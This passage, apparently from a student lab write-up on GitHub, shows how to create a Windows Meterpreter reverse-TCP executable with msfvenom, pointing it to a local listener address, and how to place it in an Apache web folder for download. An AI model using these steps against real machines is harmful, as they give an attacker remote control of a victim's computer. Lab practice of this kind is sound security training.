...
Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > dhanush1.exe```

### Output:

<img width="811" height="194" alt="image" src="https://github.com/user-attachments/assets/c1d32253-10e5-41c1-90a5-0ce5f78a93f0" />


copy the dhanush1.exe into the apache ```/var/www/html ```folder

<img width="379" height="107" alt="image" src="https://github.com/user-attachments/assets/982ad082-aa8c-4f95-9d2b-05f0cc4e0266" />
